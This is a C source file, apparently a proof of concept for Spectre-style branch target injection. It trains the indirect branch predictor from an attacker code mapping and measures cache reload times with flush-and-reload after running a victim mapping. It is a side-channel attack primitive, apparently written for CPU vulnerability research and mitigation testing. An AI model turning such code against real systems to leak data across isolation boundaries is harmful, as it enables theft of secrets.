#include <sys/mman.h>
#include <err.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>

void indir_branch_target();
void nop_branch_target();
void indir_branch_victim();
void indir_branch_victim_end();
void indir_branch_attacker();
void indir_branch_attacker_end();

void cpuid(void);
uint32_t flush_addr(void *addr);

int main(void) {
  char *cacheline_area = malloc(0x10000);
  unsigned long *cacheline_flushme_addr_ptr1 = (void*)(cacheline_area + 0x2128);
  unsigned long *cacheline_flushme_addr_ptr2 = (void*)(cacheline_area + 0x3468);
  char *cacheline_leaktome = cacheline_area + 0x4550;

  void *victim_mapping = mmap((void*)0x100000000000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  if (victim_mapping == MAP_FAILED)
    err(1, "mmap1");
  memcpy(victim_mapping, indir_branch_victim, (unsigned long)indir_branch_victim_end - (unsigned long)indir_branch_victim);

  void *attacker_mapping = mmap((void*)0x200000000000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  if (attacker_mapping == MAP_FAILED)
    err(1, "mmap2");
  memcpy(attacker_mapping, indir_branch_attacker, (unsigned long)indir_branch_attacker_end - (unsigned long)indir_branch_attacker);

  *cacheline_flushme_addr_ptr1 = (unsigned long)indir_branch_target;
  *cacheline_flushme_addr_ptr2 = (unsigned long)nop_branch_target;

  for (int i=0; i<100; i++) {
    ((void(*)(void *cacheline_flushme_addr_ptr, void *cacheline_leaktome))attacker_mapping)(cacheline_flushme_addr_ptr1, cacheline_leaktome);

    if (i == 95) {
      cpuid();
      flush_addr(cacheline_flushme_addr_ptr2);
      ((void(*)(void *cacheline_flushme_addr_ptr, void *cacheline_leaktome))attacker_mapping)(cacheline_flushme_addr_ptr1, cacheline_leaktome);
      unsigned long reloadtime_hot = flush_addr(cacheline_leaktome);
      unsigned long reloadtime_cold = flush_addr(cacheline_leaktome);
      cpuid();

      ((void(*)(void *cacheline_flushme_addr_ptr, void *cacheline_leaktome))victim_mapping)(cacheline_flushme_addr_ptr2, cacheline_leaktome);

      cpuid();
      unsigned long reloadtime_post_access = flush_addr(cacheline_leaktome);
      cpuid();

      printf("reload hot: %lu, reload cold: %lu, reload post-access: %lu\n", reloadtime_hot, reloadtime_cold, reloadtime_post_access);
    }
  }

  return 0;
}